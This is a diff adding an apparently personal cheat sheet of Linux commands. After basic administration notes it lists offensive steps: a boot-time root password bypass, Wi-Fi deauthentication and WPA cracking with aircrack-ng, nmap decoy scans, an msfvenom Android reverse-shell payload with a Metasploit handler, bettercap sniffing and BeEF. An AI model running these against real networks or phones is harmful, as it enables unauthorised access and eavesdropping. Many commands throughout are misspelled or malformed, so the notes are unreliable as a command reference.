@@ -1,0 +1,212 @@
+commands Linux
+----
+1:   /: root admin  
+2:   $: user             
+3:  ~: root home    
+4:   /home ---------------          =user data default location
+5:   /etc----------------- network settings ,changes major edit total configuration
+6:  /opt  ---------------- axulary 3rd party applications
+7: /bin------------------- basic commands
+8: /mnt------------------- sharing, temporary os location
+9: /temp ----------------- temporary
+10: /usr ----------------- user -space programs storing separate from system files
+11: /root----------------- work environment for user 
+12: /lib------------------ os
+13: /sbin----------------- super user 
+14: /var------------------ mails,lock files
+15: /media---------------- external devices
+16: cd/  ----------------- top level directory
+17: cd /root ------------- root home directory
+18: pwd ------------------ present working directory
+19: ls ------------------- list of folders and directories
+20: ls -l ---------------- total details of files and folders properties
+21: cd .. ---------------- one step back
+22: cd .. /cd .. ---------  multiple steps back
+23: cat >(filename) ------  create a file
+24: ctrl+d --------------- save file/folder
+25:cat >> (file name)----- add or offend 
+26:touch  (file) ------------- create empty file
+27:touch (file 1,2,3/folder 1,2,3)--- to create multiple 
+28:touch  (file 1.. 20/folder1..20) -- create multiple
+29:mkdir ----------------- make directories
+30:mkdir -p ------------- make multiple 
+31: rm -rf --------------- remove /file or folder
+32: mv (filename) (destination)--   move files/folders
+33: cp (filename)(destination)  -- copy files /folders
+34:find (file/folder)    ----   find folders/files
+35:hide files
+    mv .(file/folder)
+    ls. a
+36: hostnamectl --------- total details of a computer
+     hostname +new name----- change host name
+37:vi (filename)---------- file editing vi editor
+38:slink (softlink)-------- sortcut of a file/folder
+39: hlink(hardlink) ---- (copy of a file)
+40:filesystem
+41:chmod=-------------change modification
+   d=directories
+   l=symbolic link
+   - =file
+ rw= read and write
+ x=exicute
+
+ls -l-------- permissions show
+file/foldername  rwx    rwx     rwx
+                 user   group   others
+42:chmod u=rwx,g=rwx,o=rwx
+symbolic method
+    1=x
+    2=w
+    4=r
+43: chmod 7 7 7 file/foldername ---change permissions
+44:fdisk----------------partition spacececk
+45:lsblk -------list of block id
+46:mkfs ---------make a file system
+47:init 6-----ratart
+48:vi ditor
+   vi (filename)
+   i= edit 
+   esc =escape command mode
+   shift+:wq!=editd and save
+  shift+:q quit with out saving
+  gg----firstling
+  GG---- lastline
+  dd-----delete a line
+  1---9 dd ----delete lines
+  yy ---copy
+  p --paste
+  1-9 yy ----copy lines
+  u --undo
+  q! =force quite
+
+
+49:ipaddress
+    ifconfig ---ipaddrss
+   iwconig-- wifi divices
+   nmtui ---network manage use terminal 
+   nmcli----network manager comandline interface
+   nmcli con up/down (devicname lan)
+   ifconfig etho hw ether 22:33:44:55:66:11 --to change mac addrss
+ 50: Linux password break
+    
+
+  1.to escape from boot press e
+  2.press  "rd.break" in line 16 kernel line
+  3.ctrl+x
+  4.mount -o  grep sysroot
+  5.enter
+  6.mount -o remount,rw/sysroot
+  7.chroot/sysroot
+  8.passwd
+  9.touch /.autorelabel
+  10.exit
+  11.exit
+  12.restart
+
+51:firewall 
+   1.yum install firwall-y
+   2.yum install firewall*-y ---deep install
+   3.firwall -config
+   4.firwall -cmd --get -zones
+   5.firewall -cmd --permenent --add/remove -service =ssh/nfc
+   6.firewall -cmd --permenent --add/remove -service 22/tcp
+   7.firewall -cmd --reload
+   8.firewall -cmd --list -services ----to list all services
+
+52:yum ----yellow dog updater,modifier
+   yum repolist all
+
+   1. df -h
+   2.lsblk
+   3. mkdir -p crate a folder in root
+   4.mount -o loop/sr0/ created foldername
+   5.ls
+   6.cd /etc/yum.repos.d/
+   7.ls
+   8.rm -rf local.repo
+   9.ls
+   10.vi local.repo
+         [local repo]
+         name =local.repo
+         baseurl=file:///foldr/dirctoryname
+         enable=1
+         gpg check=0
+    save
+   11 yum clean all
+   12 yum reposit all
+    
+53:cloud
+   yum install nginx -y
+   systemctl status nginx
+   systenctl start/stop nginx
+   cd /usr/share/nginx/tml
+  vi index.html
+ 
+
+
+54: git
+
+  1.yum install git -y
+  2.git -status
+  3. ls-a ----idden files
+  4.git init --- to track
+  5.git add impdata  ...to add
+  6.git add *  --- all at one time
+  7.git add.   ---add idden fils
+  8.git rm --cached hk --to rmove
+  9.git commit -m "hk" ---to add directory
+  10.git branch
+  11.git log
+  12 git remote add origin --ss
+  13 git push -v --all -----to push all
+
+55:aircrack-ng
+   1. ifconfig wlan0 down
+   2.ifconfig wlan0 hw ether xx:xx:xx;xx:xx:xx
+   3.ifconfig wlan0 up
+   4.sudo airomon-ng start/stop wlan0 ---- to set monitor mode
+   5.airodump-ng wlan0   to moniter near networks
+   6.airodump-ng --bssid xx:xx:xx:xx:xx:xx --channel xx --write (file name) wlan0  ---- to monitor 
+   7.airpaly-ng --deauth 0 -a Xx:xx:xx:xx:xx:xx wlan0  ---to deauthenticate
+   8.aircrack-ng (filename) -w /usr/share/wordlists/rockyou.text
+
+56: nmap
+  1. nmap -sS -p 22,80,443 192.168.1.10
+                                            Scans only ports 22 (SSH), 80 (HTTP), and 443 (HTTPS)
+
+  2.nmap -sS -p 22,80,443 -T4 -v 192.168.1.10-T4:--------------- Faster scan
+
+  3.nmap -sn 192.168.1.0/24-sn      : Tells Nmap -----to skip the port scan and only do host discovery.
+  4.nmap -PE 192.168.1.1-PE         : Sends an ICMP Echo Request (like the ping command).
+  5.nmap -sn -PR 192.168.1.0/24-PR  : Uses ARP requests (only works on local LANs).
+  6.nmap -PA80,443 192.168.1.0/24-PA : Sends TCP ACKs.
+  7. nmap -PS22,80,443 192.168.1.0/24-PS  : Sends TCP SYNs.
+  8.nmap -sS -D [decoy1],[decoy2],...,[ME] [target]----You can add up to 10 IPs, including your own.
+  9.sudo nmap -sS -D 192.168.1.100,192.168.1.200,ME 192.168.1.10---------Sends scan packets using 3 IPs:
+  10.sudo nmap -sS -D RND:5 -p 80,443 192.168.1.10RND:5 ---: Use 5 random decoy IPs generated by Nmap
+
+57: msf
+  1.msfvenom -h  -----help
+  2.msfvenom -p android/meterpreter/reverse -tcp lost(ip) lport(port) -f >output.file
+  3.service apache start/stop
+  4.msf console
+  5.use exploit/multi/handler
+  6.set lost
+  7.set lport
+  8 run
+
+58.bettrcap
+  1. net .sniff on -----sniffing 
+  2.net.prone  on ---- probe
+  3.net.show ---------network 
+  4.https
+   5. proxy
+59. beef
+ 1.cd /usr/share/beef
+ 2../beef
+
+60. knockpy
+  1.knockpy -help
+  2.knockpy --domain name --recon  ------to list out all domains
+
+61.
